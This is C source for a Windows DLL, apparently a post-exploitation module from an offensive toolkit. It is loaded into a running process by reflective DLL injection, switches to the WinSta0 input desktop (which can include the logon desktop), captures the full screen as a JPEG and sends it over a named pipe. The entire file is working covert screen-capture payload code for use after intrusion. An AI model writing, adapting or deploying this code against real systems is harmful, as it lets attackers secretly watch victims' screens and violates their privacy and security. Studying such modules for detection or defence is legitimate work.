#include "screenshot.h"
#include "bmp2jpeg.h"

// define this as we are going to be injected via RDI
#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR

// define this as we want to use our own DllMain function
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN

// include the Reflectiveloader() function
#include "../ReflectiveDLLInjection/ReflectiveLoader.c"

/*
 * Send a buffer to a named pipe server.
 */
DWORD screenshot_send( char * cpNamedPipe, BYTE * pJpegBuffer, DWORD dwJpegSize )
{
	DWORD dwResult  = ERROR_ACCESS_DENIED;
	HANDLE hPipe    = NULL;
	DWORD dwWritten = 0;
	DWORD dwTotal   = 0;

	do
	{
		hPipe = CreateFileA( cpNamedPipe, GENERIC_ALL, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
		if( !hPipe )
			BREAK_ON_ERROR( "[SCREENSHOT] screenshot_send. CreateFileA failed" );
		
		if( !WriteFile( hPipe, (LPCVOID)&dwJpegSize, sizeof(DWORD), &dwWritten, NULL ) )
			BREAK_ON_ERROR( "[SCREENSHOT] screenshot_send. WriteFile JPEG length failed" );
		
		if( !dwJpegSize || !pJpegBuffer )
			BREAK_WITH_ERROR( "[SCREENSHOT] screenshot_send. No JPEG to transmit.", ERROR_BAD_LENGTH );

		while( dwTotal < dwJpegSize )
		{
			if( !WriteFile( hPipe, (LPCVOID)(pJpegBuffer + dwTotal), (dwJpegSize - dwTotal), &dwWritten, NULL ) )
				break;
			dwTotal += dwWritten;
		}

		if( dwTotal != dwJpegSize )
			BREAK_WITH_ERROR( "[SCREENSHOT] screenshot_send. dwTotal != dwJpegSize", ERROR_BAD_LENGTH );

		dwResult = ERROR_SUCCESS;

	} while( 0 );

	CLOSE_HANDLE( hPipe );

	return dwResult;
}

/*
 * Take a screenshot of this sessions default input desktop on WinSta0
 * and send it as a JPEG image to a named pipe.
 */
DWORD screenshot( int quality, DWORD dwPipeName )
{
	DWORD dwResult             = ERROR_ACCESS_DENIED;
	HWINSTA hWindowStation     = NULL;
	HWINSTA hOrigWindowStation = NULL;
	HDESK hInputDesktop        = NULL;
	HDESK hOrigDesktop         = NULL;
	HWND hDesktopWnd           = NULL;	
	HDC hdc                    = NULL;
	HDC hmemdc                 = NULL;
	HBITMAP hbmp               = NULL;
	BYTE * pJpegBuffer         = NULL;
	OSVERSIONINFO os           = {0};
	char cNamedPipe[MAX_PATH]  = {0};
	// If we use SM_C[X|Y]VIRTUALSCREEN we can screenshot the whole desktop of a multi monitor display.
	int xmetric               = SM_CXVIRTUALSCREEN;
	int ymetric               = SM_CYVIRTUALSCREEN;
	DWORD dwJpegSize          = 0;
	int sx                    = 0;
	int sy                    = 0;

	do
	{
		_snprintf( cNamedPipe, MAX_PATH, "\\\\.\\pipe\\%08X", dwPipeName );

		os.dwOSVersionInfoSize = sizeof( OSVERSIONINFO );

		if( !GetVersionEx( &os ) )
			BREAK_ON_ERROR( "[SCREENSHOT] screenshot: GetVersionEx failed" )
		
		// On NT we cant use SM_CXVIRTUALSCREEN/SM_CYVIRTUALSCREEN.
		if( os.dwMajorVersion <= 4 )
		{
			xmetric = SM_CXSCREEN;
			ymetric = SM_CYSCREEN;
		}
		
		// open the WinSta0 as some services are attached to a different window station.
		hWindowStation = OpenWindowStation( "WinSta0", FALSE, WINSTA_ALL_ACCESS );
		if( !hWindowStation )
		{
			if( RevertToSelf() )
				hWindowStation = OpenWindowStation( "WinSta0", FALSE, WINSTA_ALL_ACCESS );
		}
		
		// if we cant open the defaut input station we wont be able to take a screenshot
		if( !hWindowStation )
			BREAK_WITH_ERROR( "[SCREENSHOT] screenshot: Couldnt get the WinSta0 Window Station", ERROR_INVALID_HANDLE );
		
		// get the current process's window station so we can restore it later on.
		hOrigWindowStation = GetProcessWindowStation();
		
		// set the host process's window station to this sessions default input station we opened
		if( !SetProcessWindowStation( hWindowStation ) )
			BREAK_ON_ERROR( "[SCREENSHOT] screenshot: SetProcessWindowStation failed" );

		// grab a handle to the default input desktop (e.g. Default or WinLogon)
		hInputDesktop = OpenInputDesktop( 0, FALSE, MAXIMUM_ALLOWED );
		if( !hInputDesktop )
			BREAK_ON_ERROR( "[SCREENSHOT] screenshot: OpenInputDesktop failed" );

		// get the threads current desktop so we can restore it later on
		hOrigDesktop = GetThreadDesktop( GetCurrentThreadId() );

		// set this threads desktop to that of this sessions default input desktop on WinSta0
		SetThreadDesktop( hInputDesktop );

		// and now we can grab a handle to this input desktop
		hDesktopWnd = GetDesktopWindow();

		// and get a DC from it so we can read its pixels!
		hdc = GetDC( hDesktopWnd );
		if( !hdc )
			BREAK_ON_ERROR( "[SCREENSHOT] screenshot. GetDC failed" );

		// back up this DC with a memory DC
		hmemdc = CreateCompatibleDC( hdc );
		if( !hmemdc )
			BREAK_ON_ERROR( "[SCREENSHOT] screenshot. CreateCompatibleDC failed" );

		// calculate the width and height
		sx = GetSystemMetrics( xmetric );
		sy = GetSystemMetrics( ymetric );

		// and create a bitmap
		hbmp = CreateCompatibleBitmap( hdc, sx, sy );
		if( !hbmp )
			BREAK_ON_ERROR( "[SCREENSHOT] screenshot. CreateCompatibleBitmap failed" );
		
		// this bitmap is backed by the memory DC
		if( !SelectObject( hmemdc, hbmp ) )
			BREAK_ON_ERROR( "[SCREENSHOT] screenshot. SelectObject failed" );

		// BitBlt the screenshot of this sessions default input desktop on WinSta0 onto the memory DC we created 
		if( !BitBlt( hmemdc, 0, 0, sx, sy, hdc, 0, 0, SRCCOPY ) )
			BREAK_ON_ERROR( "[SCREENSHOT] screenshot. BitBlt failed" );

		// finally convert the BMP we just made into a JPEG...
		if( bmp2jpeg( hbmp, hmemdc, quality, &pJpegBuffer, &dwJpegSize ) != 1 )
			BREAK_WITH_ERROR( "[SCREENSHOT] screenshot. bmp2jpeg failed", ERROR_INVALID_HANDLE );

		// we have succeded
		dwResult = ERROR_SUCCESS;
		
	} while( 0 );

	// if we have successfully taken a screenshot we send it back via the named pipe
	// but if we have failed we send back a zero byte result to indicate this failure.
	if( dwResult == ERROR_SUCCESS )
		screenshot_send( cNamedPipe, pJpegBuffer, dwJpegSize );
	else
		screenshot_send( cNamedPipe, NULL, 0 );

	if( hdc )
		ReleaseDC( hDesktopWnd, hdc );

	if( hmemdc )
		DeleteDC( hmemdc );

	if( hbmp )
		DeleteObject( hbmp );

	// free the jpeg images buffer
	if( pJpegBuffer )
		free( pJpegBuffer );

	// restore the origional process's window station
	if( hOrigWindowStation )
		SetProcessWindowStation( hOrigWindowStation );

	// restore the threads origional desktop
	if( hOrigDesktop )
		SetThreadDesktop( hOrigDesktop );

	// close the WinSta0 window station handle we opened
	if( hWindowStation )
		CloseWindowStation( hWindowStation );

	// close this last to avoid a handle leak...
	if( hInputDesktop )
		CloseDesktop( hInputDesktop );

	return dwResult;
}

/*
 * Grab a DWORD value out of the command line.
 * e.g. screenshot_command_dword( "/FOO:0x41414141 /BAR:0xCAFEF00D", "/FOO:" ) == 0x41414141
 */
DWORD screenshot_command_dword( char * cpCommandLine, char * cpCommand )
{
	char * cpString = NULL;
	DWORD dwResult  = 0;

	do
	{
		if( !cpCommandLine || !cpCommand )
			break;
		
		cpString = strstr( cpCommandLine, cpCommand );
		if( !cpString )
			break;

		cpString += strlen( cpCommand );

		dwResult = strtoul( cpString, NULL, 0 );

	} while( 0 );

	return dwResult;
}

/*
 * Grab a int value out of the command line.
 * e.g. screenshot_command_int( "/FOO:12345 /BAR:54321", "/FOO:" ) == 12345
 */
int screenshot_command_int( char * cpCommandLine, char * cpCommand )
{
	char * cpString = NULL;
	int iResult     = 0;

	do
	{
		if( !cpCommandLine || !cpCommand )
			break;
		
		cpString = strstr( cpCommandLine, cpCommand );
		if( !cpString )
			break;

		cpString += strlen( cpCommand );

		iResult = atoi( cpString );

	} while( 0 );

	return iResult;
}

/*
 * The real entrypoint for this app.
 */
VOID screenshot_main( char * cpCommandLine )
{
	DWORD dwResult = ERROR_INVALID_PARAMETER;

	do
	{
		dprintf( "[SCREENSHOT] screenshot_main. cpCommandLine=0x%08X", (DWORD)cpCommandLine );

		if( !cpCommandLine )
			break;

		if( strlen( cpCommandLine ) == 0 )
			break;
			
		dprintf( "[SCREENSHOT] screenshot_main. lpCmdLine=%s", cpCommandLine );
		
		if( strstr( cpCommandLine, "/s" ) )
		{
			DWORD dwPipeName = 0;
			int quality      = 0;

			quality    = screenshot_command_int( cpCommandLine, "/q:" );

			dwPipeName = screenshot_command_dword( cpCommandLine, "/p:" );

			dwResult   = screenshot( quality, dwPipeName );
		}

	} while( 0 );

	dprintf( "[SCREENSHOT] screenshot_main. ExitThread dwResult=%d", dwResult );

	ExitThread( dwResult );
}

/*
 * DLL entry point. If we have been injected via RDI, lpReserved will be our command line.
 */
BOOL WINAPI DllMain( HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;

	switch( dwReason ) 
    { 
		case DLL_PROCESS_ATTACH:
			hAppInstance = hInstance;
			if( lpReserved != NULL )
				screenshot_main( (char *)lpReserved );
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }

	return bReturnValue;
}

